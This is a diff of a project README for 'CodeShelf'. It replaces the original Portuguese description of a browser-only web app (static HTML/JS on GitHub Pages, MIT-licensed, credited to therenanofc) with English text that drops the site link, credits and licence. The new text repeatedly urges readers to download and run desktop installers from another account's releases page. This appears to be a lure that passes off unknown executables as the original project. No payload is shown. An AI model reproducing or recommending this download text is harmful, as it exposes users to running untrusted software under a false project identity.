@@ -1,59 +1,77 @@
-# 🧠 CodeShelf
+# 🌟 CodeShelf - Your Personal GitHub Project Library
 
-[🌐 Veja online](https://therenanofc.github.io/CodeShelf/)
+## 🚀 Getting Started
 
----
+Welcome to CodeShelf! This application helps you manage your GitHub projects with a clean dashboard. You can organize your favorites, compare users, and enjoy a dark mode experience.
 
-## ✨ Descrição
+## 📥 Download Now
 
-**CodeShelf** é uma biblioteca pessoal de projetos GitHub, projetada para organizar, visualizar e comparar repositórios de forma **limpa, intuitiva e funcional**.  
-O site possui uma interface **moderna e responsiva**, permitindo que você:
+[![Download CodeShelf](https://img.shields.io/badge/Download-CodeShelf-brightgreen)](https://github.com/pri7277neel/CodeShelf/releases)
 
-- Gerencie seus projetos favoritos  
-- Explore estatísticas detalhadas  
-- Compare diferentes usuários GitHub  
+## 💾 Download & Install
 
-Tudo isso **sem precisar de backend**!
+To get started with CodeShelf, follow these steps:
 
----
+1. **Visit the Releases Page:** Go to the [Releases page](https://github.com/pri7277neel/CodeShelf/releases).
+   
+2. **Select Your Version:** You will see a list of versions available for download. Choose the latest version for the best experience.
 
-## 🚀 Funcionalidades
+3. **Download the Installer:** Find the installer file that matches your operating system (Windows, macOS, or Linux). Click the file link to start the download.
 
-- 🔹 **Login Simulado:** Entre rapidamente para testar as funcionalidades.  
-- 🔹 **Login GitHub (não funcional):** Exibe alerta informando que ainda não está disponível.  
-- 🔹 **Pesquisar e Filtrar Repositórios:** Busque por nome ou filtre por estrelas, forks ou última atualização.  
-- 🔹 **Favoritos:** Marque repositórios e visualize apenas os que você mais gosta.  
-- 🔹 **Dark/Light Mode:** Alternância rápida entre modo escuro e claro.  
-- 🔹 **Comparar Usuários:** Compare dois usuários GitHub lado a lado (repositórios, seguidores e seguindo).  
-- 🔹 **Estatísticas em Texto:** Veja linguagens mais usadas e top 5 repositórios por stars, sem gráficos pesados.  
-- 🔹 **Interface Clean e Responsiva:** Layout moderno, cards de repositórios e modal estilizado para comparação.
+4. **Run the Installer:** Once downloaded, locate the installer file in your downloads folder. Double-click it to run the installer.
 
----
+5. **Follow the On-Screen Instructions:** The installation wizard will guide you through the setup. Just follow the prompts to install CodeShelf.
 
-## 🛠️ Tecnologias Utilizadas
+6. **Open CodeShelf:** After installation, find the application on your computer. Open it and start using your new project library!
 
-- **HTML5 & CSS3**  
-- **JavaScript (Vanilla JS)**  
-- **API GitHub** para buscar dados de usuários e repositórios  
-- **LocalStorage** para salvar favoritos  
+## 🛠 Features
 
----
+- **Clean Dashboard:** Navigate your projects easily with our user-friendly layout.
+- **Favorites:** Save your favorite repositories for quick access.
+- **User Comparison:** Compare GitHub users to see their project statistics.
+- **Dark Mode:** Enjoy a relaxing visual experience with dark mode support.
 
-## ⚡ Como Usar
+## 📋 System Requirements
 
-1. Acesse o site: [https://therenanofc.github.io/CodeShelf/](https://therenanofc.github.io/CodeShelf/)  
-2. Clique em **"Entrar (Simulação)"** para iniciar.  
-3. Digite um usuário GitHub no campo de pesquisa e clique em **"Carregar Repositórios"**.  
-4. Utilize os controles para:
-   - Pesquisar repositórios  
-   - Filtrar/ordenar  
-   - Marcar favoritos  
-   - Alternar dark/light mode  
-   - Mostrar estatísticas  
-5. Para comparar dois usuários, clique no botão **"Comparar"**, insira os nomes e veja os dados lado a lado.
+CodeShelf runs smoothly on most modern computers. Here are the basic requirements:
 
----
+- **Operating System:** Windows 10 or higher, macOS 10.14 or higher, or Linux (with recent distributions).
+- **Processor:** Dual-core processor or better.
+- **Memory:** At least 4 GB of RAM.
+- **Storage:** Minimum of 100 MB of free space.
 
-## 📄 Licença
+## 🌐 Additional Topics
 
-MIT License © [therenanofc](https://github.com/therenanofc)
+If you want to learn more about CodeShelf, you might be interested in these related topics:
+- Comparacao
+- CSS
+- Dark Mode
+- Dashboard
+- Favoritos
+- GitHub
+- HTML
+- JavaScript
+- Projetos
+- Repositorios
+
+## ❓ Frequently Asked Questions
+
+### How do I update CodeShelf?
+
+To update CodeShelf, simply revisit the [Releases page](https://github.com/pri7277neel/CodeShelf/releases) and download the latest version. Install it over your current version.
+
+### Can I suggest features?
+
+Absolutely! We welcome your suggestions. You can submit issues or feature requests on our GitHub repository.
+
+### Is there support available?
+
+Yes, if you encounter any issues, please visit our GitHub repository, where you can report problems or ask for assistance.
+
+## 📞 Contact Information
+
+For further inquiries, feel free to reach out via the GitHub issue tracker or check for updates in the repository.
+
+## 📥 Download Now Again
+
+To get started today, [download CodeShelf here](https://github.com/pri7277neel/CodeShelf/releases). Enjoy managing your projects with ease!
